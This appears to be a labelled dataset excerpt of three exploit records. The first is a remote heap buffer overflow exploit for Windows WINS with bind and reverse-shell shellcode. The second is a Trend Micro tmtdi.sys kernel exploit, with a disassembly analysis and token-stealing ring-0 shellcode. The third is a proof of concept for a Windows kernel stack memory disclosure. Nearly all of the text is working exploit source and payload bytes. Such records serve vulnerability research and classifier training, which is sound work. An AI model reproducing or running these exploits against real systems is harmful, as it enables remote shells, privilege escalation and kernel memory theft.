-=[®class101.org]=-  */  #include <stdio.h> #include <string.h> #ifdef WIN32 #include ""winsock2.h"" #pragma comment(lib, ""ws2_32"") #else #include <sys/types.h> #include <sys/socket.h> #include <sys/time.h> #include <netinet/in.h> #include <netinet/in_systm.h> #include <netinet/ip.h> #include <netdb.h> #include <arpa/inet.h> #include <unistd.h> #include <stdlib.h> #include <fcntl.h> #endif  char scode1[]= ""\x33\xC9\x83\xE9"" ""\xAF\xD9\xEE\xD9\x74\x24\xF4\x5B\x81\x73\x13\xBB"" ""\x1E\xD3\x6A\x83\xEB\xFC\xE2\xF4\x47\x74\x38\x25\x53\xE7\x2C\x95"" ""\x44\x7E\x58\x06\x9F\x3A\x58\x2F\x87\x95\xAF\x6F\xC3\x1F\x3C\xE1"" ""\xF4\x06\x58\x35\x9B\x1F\x38\x89\x8B\x57\x58\x5E\x30\x1F\x3D\x5B"" ""\x7B\x87\x7F\xEE\x7B\x6A\xD4\xAB\x71\x13\xD2\xA8\x50\xEA\xE8\x3E"" ""\x9F\x36\xA6\x89\x30\x41\xF7\x6B\x50\x78\x58\x66\xF0\x95\x8C\x76"" ""\xBA\xF5\xD0\x46\x30\x97\xBF\x4E\xA7\x7F\x10\x5B\x7B\x7A\x58\x2A"" ""\x8B\x95\x93\x66\x30\x6E\xCF\xC7\x30\x5E\xDB\x34\xD3\x90\x9D\x64"" ""\x57\x4E\x2C\xBC\x8A\xC5\xB5\x39\xDD\x76\xE0\x58\xD3\x69\xA0\x58"" ""\xE4\x4A\x2C\xBA\xD3\xD5\x3E\x96\x80\x4E\x2C\xBC\xE4\x97\x36\x0C"" ""\x3A\xF3\xDB\x68\xEE\x74\xD1\x95\x6B\x76\x0A\x63\x4E\xB3\x84\x95"" ""\x6D\x4D\x80\x39\xE8\x4D\x90\x39\xF8\x4D\x2C\xBA\xDD\x76\xD3\x0F"" ""\xDD\x4D\x5A\x8B\x2E\x76\x77\x70\xCB\xD9\x84\x95\x6D\x74\xC3\x3B"" ""\xEE\xE1\x03\x02\x1F\xB3\xFD\x83\xEC\xE1\x05\x39\xEE\xE1\x03\x02"" ""\x5E\x57\x55\x23\xEC\xE1\x05\x3A\xEF\x4A\x86\x95\x6B\x8D\xBB\x8D"" ""\xC2\xD8\xAA\x3D\x44\xC8\x86\x95\x6B\x78\xB9\x0E\xDD\x76\xB0\x07"" ""\x32\xFB\xB9\x3A\xE2\x37\x1F\xE3\x5C\x74\x97\xE3\x59\x2F\x13\x99"" ""\x11\xE0\x91\x47\x45\x5C\xFF\xF9\x36\x64\xEB\xC1\x10\xB5\xBB\x18"" ""\x45\xAD\xC5\x95\xCE\x5A\x2C\xBC\xE0\x49\x81\x3B\xEA\x4F\xB9\x6B"" ""\xEA\x4F\x86\x3B\x44\xCE\xBB\xC7\x62\x1B\x1D\x39\x44\xC8\xB9\x95"" ""\x44\x29\x2C\xBA\x30\x49\x2F\xE9\x7F\x7A\x2C\xBC\xE9\xE1\x03\x02"" ""\x54\xD0\x33\x0A\xE8\xE1\x05\x95\x6B\x1E\xD3\x6A"";   char scode2[]= /*original vlad902's reverse shellcode from metasploit.com   NOT xored, modded by class101 for ca's xpl0it to remove the common badchar ""\x20""   original bytes + modded = 291 + 3 = 294 bytes reverse shellcode v1.31*/ ""\xFC\x6A\xEB\x52"" /*modded adjusting jump*/ ""\xE8\xF9\xFF\xFF\xFF\x60\x8B\x6C\x24\x24\x8B\x45\x3C\x8B\x7C\x05"" ""\x78\x01\xEF"" ""\x83\xC7\x01"" /*modded, adding 1 to edi*/ ""\x8B\x4F\x17"" /*modded, adjusting ecx*/ ""\x8B\x5F\x1F"" /*modded, adjusting ebx, ""\x20"" out, yeahouu ;>*/ ""\x01\xEB\xE3\x30\x49\x8B\x34\x8B\x01\xEE\x31\xC0\x99\xAC\x84\xC0"" ""\x74\x07\xC1\xCA\x0D\x01\xC2\xEB\xF4\x3B\x54\x24\x28\x75\xE3"" ""\x8B\x5F\x23"" /*modded, adjusting ebx*/ ""\x01\xEB\x66\x8B\x0C\x4B"" ""\x8B\x5F\x1B"" /*modded, adjusting ebx*/ ""\x01\xEB\x03\x2C\x8B\x89\x6C\x24\x1C\x61\xC3\x31\xC0\x64\x8B\x40"" ""\x30\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\x5E\x68\x8E\x4E\x0E"" ""\xEC\x50\xFF\xD6\x31\xDB\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32"" ""\x5F\x54\xFF\xD0\x68\xCB\xED\xFC\x3B\x50\xFF\xD6\x5F\x89\xE5\x66"" ""\x81\xED\x08\x02\x55\x6A\x02\xFF\xD0\x68\xD9\x09\xF5\xAD\x57\xFF"" ""\xD6\x53\x53\x53\x53\x43\x53\x43\x53\xFF\xD0\x68\x00\x00\x00\x00"" ""\x66\x68\x00\x00\x66\x53\x89\xE1\x95\x68\xEC\xF9\xAA\x60\x57\xFF"" ""\xD6\x6A\x10\x51\x55\xFF\xD0\x66\x6A\x64\x66\x68\x63\x6D\x6A\x50"" ""\x59\x29\xCC\x89\xE7\x6A\x44\x89\xE2\x31\xC0\xF3\xAA\x95\x89\xFD"" ""\xFE\x42\x2D\xFE\x42\x2C\x8D\x7A\x38\xAB\xAB\xAB\x68\x72\xFE\xB3"" ""\x16\xFF\x75\x28\xFF\xD6\x5B\x57\x52\x51\x51\x51\x6A\x01\x51\x51"" ""\x55\x51\xFF\xD0\x68\xAD\xD9\x05\xCE\x53\xFF\xD6\x6A\xFF\xFF\x37"" ""\xFF\xD0\x68\xE7\x79\xC6\x79\xFF\x75\x04\xFF\xD6\xFF\x77\xFC\xFF"" ""\xD0\x68\xEF\xCE\xE0\x60\x53\xFF\xD6\xFF\xD0"";  char bug[]= ""\x00\x00\x07\xD0\x00\x00\xFF\x00\x05\x39\x1F\xBC\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90"";  char payload[256],payload2[4096]; int tot;  char pad[]=""\x00\x00\x00\x00"",padB[]=""\xEB\x07""; char ret1[]=""\xFC\x20\x39\x05""; char ret1b[]=""\x20\xF0\xFD\x7F""; char repair[]=""\xC7\x05\x20\xF0\xFD\x7F\x60\x20\xF8\x77""; char sip[3],spo[1];  #ifdef WIN32 	WSADATA wsadata; #endif  void ver(); void usage(char* us); void sl(int time);  int main(int argc,char *argv[]) { 	ver(); 	int check1, check2; 	unsigned long gip; 	unsigned short gport; 	char *what, *where, *os; 	if (argc>6||argc<3||atoi(argv[1])>1||atoi(argv[1])<1){usage(argv[0]);return -1;} 	if (argc==5||strlen(argv[2])<7){usage(argv[0]);return -1;} 	if (argc==6){if (strlen(argv[4])<7){usage(argv[0]);return -1;}} #ifndef WIN32 	if (argc==6) 	{  		gip=inet_addr(argv[4])^(long)0x00000000; 		gport=htons(atoi(argv[5]))^(short)0x0000; 		memcpy(&sip[0], &gip, 4);memcpy(&spo[0], &gport, 2); 		check1=strlen(&sip[0]);check2=strlen(&spo[0]); 		if (check1 == 0||check1 == 1||check1 == 2||check1 == 3){ 			printf(""[+] error, the IP has a null byte in hex...\n"");return -1;} 		if (check2 != 2){printf(""[+] error, the PORT has a null byte in hex...\n"");return -1;} 	} #define Sleep		sleep #define SOCKET		int #define closesocket(s) close(s) #else 	if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){printf(""[+] wsastartup error\n"");return -1;} 	if (argc==6) 	{ 		gip=inet_addr(argv[4])^(ULONG)0x00000000; 		gport=htons(atoi(argv[5]))^(USHORT)0x0000; 		memcpy(&sip[0], &gip, 4);memcpy(&spo[0], &gport, 2); 		check1=strlen(&sip[0]);check2=strlen(&spo[0]); 		if (check1 == 0||check1 == 1||check1 == 2||check1 == 3){ 			printf(""[+] error, the IP has a null byte in hex...\n"");return -1;} 		if (check2 != 2){printf(""[+] error, the PORT has a null byte in hex...\n"");return -1;} 	} #endif 	int ip=htonl(inet_addr(argv[2])), port; 	if (argc==4||argc==6){port=atoi(argv[3]);} else port=42; 	SOCKET s;fd_set mask;struct timeval timeout; struct sockaddr_in server; 	s=socket(AF_INET,SOCK_STREAM,0); 	if (s==-1){printf(""[+] socket() error\n"");return -1;} 	if (atoi(argv[1]) == 1){what=ret1;where=ret1b;os=""Win2k SP4          Server ENGLISH\n[+]                       Win2k SP4 Advanced Server ENGLISH\n"";} 	printf(""[+]               TARGET: %s\n"",os);sl(1); 	server.sin_family=AF_INET; 	server.sin_addr.s_addr=htonl(ip); 	server.sin_port=htons(port); 	connect(s,( struct sockaddr *)&server,sizeof(server)); 	timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask); 	switch(select(s+1,NULL,&mask,NULL,&timeout)) 	{ 		case -1: {printf(""[+] select() error\n"");closesocket(s);return -1;} 		case 0: {printf(""[+] connection failed\n"");closesocket(s);return -1;} 		default: 		if(FD_ISSET(s,&mask)) 		{ 			printf(""[+] connected\n"");sl(1); 			printf(""[+] building the payload..\n"");sl(1); 			memset(payload,0x90,196);memcpy(payload+132,what,4);memcpy(payload+136,where,4); 			memcpy(&bug[84], what, 4);memcpy(&bug[88], where, 4); 			memset(payload2,0x90,2100); 			memcpy(payload2+252,padB,2);memcpy(payload2+52,padB,2); 			memcpy(payload2+263,repair,10);memcpy(payload2+63,repair,10); 			if (argc==6) 			{ 				memcpy(&scode2[167], &gip, 4); 				memcpy(&scode2[173], &gport, 2); 				memcpy(payload2+350,scode2,strlen(scode2)); 			} 			else memcpy(payload2+350,scode1,strlen(scode1)); 			printf(""[+] sh0uting the heap!\n"");sl(1); 			if (send(s,bug,sizeof(bug)-1,0)==-1) { printf(""[+] sending error, the server prolly rebooted.\n"");return -1;} 			if (send(s,pad,sizeof(pad)-1,0)==-1) { printf(""[+] sending error, the server prolly rebooted.\n"");return -1;} 			if (send(s,payload,strlen(payload),0)==-1) { printf(""[+] sending error, the server prolly rebooted.\n"");return -1;} 			if (send(s,pad,sizeof(pad)-1,0)==-1) { printf(""[+] sending error, the server prolly rebooted.\n"");return -1;} 			if (send(s,payload2,strlen(payload2),0)==-1) { printf(""[+] sending error, the server prolly rebooted.\n"");return -1;} 			sl(3); 			tot=sizeof(bug)-1+(sizeof(pad)*2)-2+strlen(payload)+strlen(payload2); 			printf(""[+]\n[+] payload size: %d\n"",tot);sl(1); 			if (argc==6){printf(""[+] payload sent, look at your listener, you should get a shell\n"");} 			else printf(""[+] payload sent, use telnet %s:101 to get a shell\n"",inet_ntoa(server.sin_addr)); 			return 0; 		} 	} 	closesocket(s); #ifdef WIN32 	WSACleanup(); #endif 	return 0; }   void usage(char* us) { 	printf(""                                                                                \n""); 	printf(""      [+]  . 101_WINS.exe Target VulnIP (bind mode)                             \n""); 	printf(""      [+]  . 101_WINS.exe Target VulnIP VulnPORT (bind mode)                    \n""); 	printf(""      [+]  . 101_WINS.exe Target VulnIP VulnPORT GayIP GayPORT (reverse mode)   \n""); 	printf(""TARGETS:                                                                        \n""); 	printf(""      [+] 1. Win2k SP4          Server English (*) - v5.0.2195                  \n""); 	printf(""      [+] 1. Win2k SP4 Advanced Server English (*) - v5.0.2195                  \n""); 	printf(""NOTE:                                                                           \n""); 	printf(""      The exploit bind a cmdshell port 101 or                                   \n""); 	printf(""      reverse a cmdshell on your listener.                                      \n""); 	printf(""      A wildcard (*) mean tested working, else, supposed working.               \n""); 	printf(""      A symbol   (-) mean all.                                                  \n""); 	printf(""      Compilation msvc6, cygwin, Linux.                                         \n""); 	printf(""                                                                                \n""); 	return; }  void ver() { 	printf(""                                                                     \n""); 	printf(""        ===================================================[v0.3]====\n""); 	printf(""        ============Windows Internet Name Service (WINS)=============\n""); 	printf(""        ============Remote Heap Buffer Overflow Exploit==============\n""); 	printf(""        ======coded by class101=============[Hat-Squad.com 2005]=====\n""); 	printf(""        =============================================================\n""); 	printf(""                                                                     \n""); }  void sl(int time) { #ifdef WIN32 			Sleep(time*1000); #else 			Sleep(time); #endif }  // milw0rm.com [2005-04-12]","[""'WINS'""]",1
15376,"Trend Micro Titanium Maximum Security 2011 - Local Kernel /* 1.Description:  The tmtdi.sys kernel driver distributed with Trend Micro Titanium Maximum Security 2011 contains a pointer overwrite vulnerability in the handling of IOCTL 0x220404.  Exploitation of this issue allows an attacker to execute arbitrary code within the kernel. An attacker would need local access to a vulnerable computer to exploit this vulnerability.    Affected application: Trend Micro Titanium Maximum Security 2011, up to date version 3.0.1303. Affected file: tmtdi.sys version 6.5.0.1234.  2.Vulnerability details:  IoCtl handler of \\.\tmtdi device drivesr:   .text:0001D3CC ; int __stdcall sub_1D3CC(PDEVICE_OBJECT DeviceObject, PIRP pIrp) .text:0001D3CC sub_1D3CC       proc near               ; DATA XREF: sub_1DD40+D0o .text:0001D3CC .text:0001D3CC var_4           = dword ptr -4 .text:0001D3CC DeviceObject    = dword ptr  8 .text:0001D3CC pIrp            = dword ptr  0Ch .text:0001D3CC .text:0001D3CC                 mov     edi, edi .text:0001D3CE                 push    ebp .text:0001D3CF                 mov     ebp, esp .text:0001D3D1                 push    ecx .text:0001D3D2                 mov     eax, [ebp+DeviceObject] .text:0001D3D5                 mov     eax, [eax+28h] .text:0001D3D8                 and     [ebp+var_4], 0 .text:0001D3DC                 push    ebx .text:0001D3DD                 mov     ebx, [ebp+pIrp] .text:0001D3E0                 push    esi .text:0001D3E1                 mov     esi, ds:MmIsAddressValid .text:0001D3E7                 push    edi .text:0001D3E8                 mov     edi, [ebx+60h] .text:0001D3EB                 push    edi             ; VirtualAddress .text:0001D3EC                 mov     [ebp+pIrp], eax .text:0001D3EF                 call    esi ; MmIsAddressValid .text:0001D3F1                 test    al, al .text:0001D3F3                 jnz     short loc_1D403  [..]  .text:0001DAF3                 mov     eax, ecx .text:0001DAF5                 sub     eax, 220078h .text:0001DAFA                 jz      loc_1DC89 .text:0001DB00                 sub     eax, 18h .text:0001DB03                 jz      loc_1DC51 .text:0001DB09                 push    4 .text:0001DB0B                 pop     edi .text:0001DB0C                 sub     eax, edi .text:0001DB0E                 jz      loc_1DC30 .text:0001DB14                 sub     eax, 2Ch .text:0001DB17                 jz      loc_1DBF1 .text:0001DB1D                 sub     eax, 14h .text:0001DB20                 jz      loc_1DBBD .text:0001DB26                 sub     eax, 330h .text:0001DB2B                 jz      short loc_1DB7B  [..]  .text:0001DB7B loc_1DB7B:                              ; CODE XREF: sub_1D3CC+75Fj .text:0001DB7B                 test    dword_2289C, 10000000h .text:0001DB85                 mov     edi, [ebx+0Ch] .text:0001DB88                 jz      short loc_1DB95 .text:0001DB8A                 push    offset aIoctrl_bind_cf ; ""[IOCTRL_BIND_CFW]\n"" .text:0001DB8F                 call    DbgPrint .text:0001DB94                 pop     ecx .text:0001DB95                 push    edi             ; VirtualAddress .text:0001DB96                 call    esi ; MmIsAddressValid .text:0001DB98                 test    al, al .text:0001DB9A                 jz      loc_1DD19 .text:0001DBA0                 cmp     [ebp+DeviceObject], 8 ; check for length .text:0001DBA4                 jb      loc_1DD19 .text:0001DBAA                 mov     eax, [edi] ; eax - first DWORD from our buffer .text:0001DBAC                 mov     dword_228B4, eax ; pointer overwrite     This address contains value that interprets as function pointer. Function sub_10CD4 uses this value as function pointer.  .text:00010CD4 sub_10CD4       proc near               ; CODE XREF: sub_19234+480p .text:00010CD4                                         ; sub_197FC+1D5p ... .text:00010CD4                 mov     edi, edi .text:00010CD6                 push    ebp .text:00010CD7                 mov     ebp, esp .text:00010CD9                 mov     ecx, dword_228B4 ; copy to ecx .text:00010CDF                 xor     eax, eax .text:00010CE1                 test    ecx, ecx .text:00010CE3                 jz      short loc_10CE8 ; is NULL pointer .text:00010CE5                 pop     ebp .text:00010CE6                 jmp     ecx  ; direct jump to our shellcode .text:00010CE8 ; --------------------------------------------------------------------------- .text:00010CE8 .text:00010CE8 loc_10CE8:                              ; CODE XREF: sub_10CD4+Fj .text:00010CE8                 pop     ebp .text:00010CE9                 retn    4 .text:00010CE9 sub_10CD4       endp  We could invoke sub_10CD4 function by calling function bind.   Exploit code in exploit.c file (bellow). */  /* # Exploit Title: Trend Micro Titanium Maximum Security 2011 0day Local Kernel Exploit # Date: 2010-11-01  # Author: Nikita Tarakanov (CISS Research Team) # Software Link: http://us.trendmicro.com/us/products/personal/titanium-maximum-security/ # Version: up to date, version 3.0.1303, tmtdi.sys version 6.5.0.1234 # Tested on: Win XP SP3, Win Vista SP2, Win 7 # CVE : CVE-NO-MATCH # Status : Unpatched */ #include <stdio.h> #include ""winsock2.h"" #include <windows.h>  #pragma comment(lib, ""wininet.lib"") #pragma comment(lib, ""Ws2_32.lib"")   static unsigned char win2k3_ring0_shell[] =   /* _ring0 */   ""\xb8\x24\xf1\xdf\xff""   ""\x8b\x00""   ""\x8b\xb0\x18\x02\x00\x00""   ""\x89\xf0""   /* _sys_eprocess_loop   */   ""\x8b\x98\x94\x00\x00\x00""   ""\x81\xfb\x04\x00\x00\x00""   ""\x74\x11""   ""\x8b\x80\x9c\x00\x00\x00""   ""\x2d\x98\x00\x00\x00""   ""\x39\xf0""   ""\x75\xe3""   ""\xeb\x21""   /* _sys_eprocess_found  */   ""\x89\xc1""   ""\x89\xf0""    /* _cmd_eprocess_loop   */   ""\x8b\x98\x94\x00\x00\x00""   ""\x81\xfb\x00\x00\x00\x00""   ""\x74\x10""   ""\x8b\x80\x9c\x00\x00\x00""   ""\x2d\x98\x00\x00\x00""   ""\x39\xf0""   ""\x75\xe3""   /* _not_found           */   ""\xcc""   /* _cmd_eprocess_found    * _ring0_end           */    /* copy tokens!$%!      */   ""\x8b\x89\xd8\x00\x00\x00""   ""\x89\x88\xd8\x00\x00\x00""   ""\x90"";  static unsigned char winvista_ring0_shell[] =   /* _ring0 */   ""\x64\xa1\x24\x01\x00\x00""   //""\x8b\x00""   ""\x8b\x70\x48""   ""\x89\xf0""   /* _sys_eprocess_loop   */   ""\x8b\x98\x9c\x00\x00\x00""   ""\x81\xfb\x04\x00\x00\x00""   ""\x74\x11""   ""\x8b\x80\xa4\x00\x00\x00""   ""\x2d\xa0\x00\x00\x00""   ""\x39\xf0""   ""\x75\xe3""   ""\xeb\x21""   /* _sys_eprocess_found  */   ""\x89\xc1""   ""\x89\xf0""    /* _cmd_eprocess_loop   */   ""\x8b\x98\x9c\x00\x00\x00""   ""\x81\xfb\x00\x00\x00\x00""   ""\x74\x10""   ""\x8b\x80\xa4\x00\x00\x00""   ""\x2d\xa0\x00\x00\x00""   ""\x39\xf0""   ""\x75\xe3""   /* _not_found           */   ""\xcc""   /* _cmd_eprocess_found    * _ring0_end           */    /* copy tokens!$%!      */   ""\x8b\x89\xe0\x00\x00\x00""   ""\x89\x88\xe0\x00\x00\x00""   ""\x90"";   static unsigned char win7_ring0_shell[] =   /* _ring0 */   ""\x64\xa1\x24\x01\x00\x00""   ""\x8b\x70\x50""   ""\x89\xf0""   /* _sys_eprocess_loop   */   ""\x8b\x98\xb4\x00\x00\x00""   ""\x81\xfb\x04\x00\x00\x00""   ""\x74\x11""   ""\x8b\x80\xbc\x00\x00\x00""   ""\x2d\xb8\x00\x00\x00""   ""\x39\xf0""   ""\x75\xe3""   ""\xeb\x21""   /* _sys_eprocess_found  */   ""\x89\xc1""   ""\x89\xf0""    /* _cmd_eprocess_loop   */   ""\x8b\x98\xb4\x00\x00\x00""   ""\x81\xfb\x00\x00\x00\x00""   ""\x74\x10""   ""\x8b\x80\xbc\x00\x00\x00""   ""\x2d\xb8\x00\x00\x00""   ""\x39\xf0""   ""\x75\xe3""   /* _not_found           */   ""\xcc""   /* _cmd_eprocess_found    * _ring0_end           */    /* copy tokens!$%!      */   ""\x8b\x89\xf8\x00\x00\x00""   ""\x89\x88\xf8\x00\x00\x00""   ""\x90"";   static unsigned char winxp_ring0_shell[] =   /* _ring0 */   ""\xb8\x24\xf1\xdf\xff""   ""\x8b\x00""   ""\x8b\x70\x44""   ""\x89\xf0""   /* _sys_eprocess_loop   */   ""\x8b\x98\x84\x00\x00\x00""   ""\x81\xfb\x04\x00\x00\x00""   ""\x74\x11""   ""\x8b\x80\x8c\x00\x00\x00""   ""\x2d\x88\x00\x00\x00""   ""\x39\xf0""   ""\x75\xe3""   ""\xeb\x21""   /* _sys_eprocess_found  */   ""\x89\xc1""   ""\x89\xf0""    /* _cmd_eprocess_loop   */   ""\x8b\x98\x84\x00\x00\x00""   ""\x81\xfb\x00\x00\x00\x00""   ""\x74\x10""   ""\x8b\x80\x8c\x00\x00\x00""   ""\x2d\x88\x00\x00\x00""   ""\x39\xf0""   ""\x75\xe3""   /* _not_found           */   ""\xcc""   /* _cmd_eprocess_found    * _ring0_end           */    /* copy tokens!$%!      */   ""\x8b\x89\xc8\x00\x00\x00""   ""\x89\x88\xc8\x00\x00\x00""   ""\x90"";   static unsigned char freeze[] =   ""\xeb\xfe"";    DWORD WINAPI ResetPointer( LPVOID lpParam ) {         HANDLE   hDevice;         DWORD *inbuff;         DWORD ioctl = 0x220404, in = 0x10, out = 0x0C, len;          DWORD interval = 500;//enough?!         Sleep(interval);         inbuff = (DWORD *)malloc(0x1000);         if(!inbuff){                 printf(""malloc failed!\n"");                 return 0;         }          *inbuff = 0;         hDevice = (HANDLE)lpParam;         DeviceIoControl(hDevice, ioctl, (LPVOID)inbuff, in, (LPVOID)inbuff, out, &len, NULL);         free(inbuff);          return 0; }  static PCHAR fixup_ring0_shell (DWORD ppid, DWORD *zlen) {         DWORD dwVersion, dwMajorVersion, dwMinorVersion;          dwVersion = GetVersion ();         dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));         dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));          printf(""dwMajorVersion = %d dwMinorVersion %d\n"", dwMajorVersion, dwMinorVersion);          switch (dwMajorVersion)         {                 case 5:                         switch (dwMinorVersion)                         {                                 case 1:                                         *zlen = sizeof winxp_ring0_shell - 1;                                         *(PDWORD) &winxp_ring0_shell[55] = ppid;                                         return (winxp_ring0_shell);                                 case 2:                                         *zlen = sizeof win2k3_ring0_shell - 1;                                         *(PDWORD) &win2k3_ring0_shell[58] = ppid;                                         return (win2k3_ring0_shell);                                  default:                                         printf(""GetVersion, unsupported version\n"");                                         exit(EXIT_FAILURE);                         }                  case 6:                         switch (dwMinorVersion)                         {                                 case 0:                                         *zlen = sizeof winvista_ring0_shell - 1;                                         *(PDWORD) &winvista_ring0_shell[54] = ppid;                                         return (winvista_ring0_shell);                                  case 1:                                         *zlen = sizeof win7_ring0_shell - 1;                                         *(PDWORD) &win7_ring0_shell[54] = ppid;                                         return (win7_ring0_shell);                                  default:                                         printf(""GetVersion, unsupported version\n"");                                         exit(EXIT_FAILURE);                         }                  default:                         printf(""GetVersion, unsupported version\n"");                         exit(EXIT_FAILURE);         }          return (NULL); }   int main(int argc, char **argv) {         HANDLE   hDevice, hThread;         DWORD *inbuff;         DWORD ioctl = 0x220404, in = 0x10, out = 0x0C, len, zlen, ppid;         LPVOID zpage, zbuf;          struct sockaddr_in service;          // Initialize Winsock         WSADATA wsaData;         SOCKET ListenSocket;         int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);           printf (""Trend Micro Titanium Maximum Security 2011 0day Local Kernel Exploit\n""                   ""by: Nikita Tarakanov (CISS Research Team)\n"");          if (iResult != NO_ERROR) printf(""Error at WSAStartup()\n"");          if (argc <= 1)         {                 printf(""Usage: %s <processid to elevate>\n"", argv[0]);                 return 0;         }          ppid = atoi(argv[1]);          zpage = VirtualAlloc(NULL, 0x1000, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);         if (zpage == NULL)         {                 printf(""VirtualAlloc failed\n"");                 return 0;         }         printf(""Ring 0 shellcode at 0x%08X address\n"", zpage, 0x10000);          memset(zpage, 0xCC, 0x1000);         zbuf = fixup_ring0_shell(ppid, &zlen);         memcpy((PCHAR)zpage, (PCHAR)zbuf, zlen);         memcpy((PCHAR)zpage + zlen, (PCHAR)freeze, sizeof (freeze) - 1);         if ( (hDevice = CreateFileA(""\\\\.\\tmtdi"",                                                   GENERIC_READ|GENERIC_WRITE,                                                   0,                                                   0,                                                   OPEN_EXISTING,                                                   0,                                                   NULL) ) != INVALID_HANDLE_VALUE )         {                 printf(""Device succesfully opened!\n"");         }         else         {                 printf(""Error: Error opening device \n"");                 return 0;         }          inbuff = (DWORD *)malloc(0x1000);         if(!inbuff){                 printf(""malloc failed!\n"");                 return 0;         }          *inbuff = zpage;         DeviceIoControl(hDevice, ioctl, (LPVOID)inbuff, in, (LPVOID)inbuff, out, &len, NULL);         free(inbuff);           hThread = CreateThread(NULL, 0, ResetPointer, hDevice, 0, NULL);          if(!hThread){                 printf(""CreateThread failed!\n"");         }           ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);         if (ListenSocket == INVALID_SOCKET) {                 printf(""Error at socket: %ld\n"", WSAGetLastError());                 WSACleanup();                 return 0 ;         }         service.sin_family = AF_INET;         service.sin_addr.s_addr = inet_addr(""127.0.0.1"");         service.sin_port = htons(27015);          // Jump to shellcode         if (bind( ListenSocket, (SOCKADDR*) &service, sizeof(service)) == SOCKET_ERROR) {                 printf(""bind failed!\n"");                 closesocket(ListenSocket);                 return 0 ;         }          WSACleanup();           return 0;  }","['tmtdi.sys', '0x220404']",1
44465,"Microsoft Windows - 'nt!NtQueryVirtualMemory (MemoryImageInformation)' Kernel 64-bit Stack Memory Disclosure /* We have discovered that the nt!NtQueryVirtualMemory system call invoked with the MemoryImageInformation (0x6) information class discloses uninitialized kernel stack memory to user-mode clients. The vulnerability affects 64-bit versions of Windows 8 to 10.  The layout of the corresponding output buffer is unknown to us; however, we have determined that an output size of 24 bytes is accepted. At the end of that memory area, 4 uninitialized bytes from the kernel stack can be leaked to the client application.  The attached proof-of-concept program demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call with the MemoryImageInformation info class and the allowed output size. An example output is as follows:  --- cut ---   Status: 0, Return Length: 18   00000000: 00 00 f3 0c f7 7f 00 00 00 20 02 00 00 00 00 00 ......... ......   00000010: 00 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........ --- cut ---  It is clearly visible here that the 4 trailing bytes copied from ring-0 to ring-3 remained uninitialized. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space. */  #include <Windows.h> #include <winternl.h>  #include <cstdio>  #pragma comment(lib, ""ntdll.lib"")  #define MemoryImageInformation ((MEMORY_INFORMATION_CLASS)6)  extern ""C"" {   typedef DWORD MEMORY_INFORMATION_CLASS;   NTSTATUS NTAPI NtQueryVirtualMemory(     _In_      HANDLE                   ProcessHandle,     _In_opt_  PVOID                    BaseAddress,     _In_      MEMORY_INFORMATION_CLASS MemoryInformationClass,     _Out_     PVOID                    MemoryInformation,     _In_      SIZE_T                   MemoryInformationLength,     _Out_opt_ PSIZE_T                  ReturnLength   ); };  VOID PrintHex(PVOID Buffer, ULONG dwBytes) {   PBYTE Data = (PBYTE)Buffer;   for (ULONG i = 0; i < dwBytes; i += 16) {     printf(""%.8x: "", i);      for (ULONG j = 0; j < 16; j++) {       if (i + j < dwBytes) {         printf(""%.2x "", Data[i + j]);       }       else {         printf(""?? "");       }     }      for (ULONG j = 0; j < 16; j++) {       if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {         printf(""%c"", Data[i + j]);       }       else {         printf(""."");       }     }      printf(""\n"");   } }  VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {   for (ULONG i = 0; i < size; i++) {     ptr[i] = byte;   } }  VOID SprayKernelStack() {   static bool initialized = false;   static HPALETTE(NTAPI *EngCreatePalette)(     _In_ ULONG iMode,     _In_ ULONG cColors,     _In_ ULONG *pulColors,     _In_ FLONG flRed,     _In_ FLONG flGreen,     _In_ FLONG flBlue     );    if (!initialized) {     EngCreatePalette = (HPALETTE(NTAPI*)(ULONG, ULONG, ULONG *, FLONG, FLONG, FLONG))GetProcAddress(LoadLibrary(L""gdi32.dll""), ""EngCreatePalette"");     initialized = true;   }    static ULONG buffer[256];   MyMemset((PBYTE)buffer, 'A', sizeof(buffer));   EngCreatePalette(1, ARRAYSIZE(buffer), buffer, 0, 0, 0);   MyMemset((PBYTE)buffer, 'B', sizeof(buffer)); }  int main() {   static BYTE OutputBuffer[1024];    SprayKernelStack();    SIZE_T ReturnLength = 0;   NTSTATUS Status = NtQueryVirtualMemory(GetCurrentProcess(), GetModuleHandle(NULL), MemoryImageInformation, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);    printf(""Status: %x, Return Length: %x\n"", Status, ReturnLength);   PrintHex(OutputBuffer, ReturnLength);    return 0; }","['nt!NtQueryVirtualMemory', 'MemoryImageInformation']",1
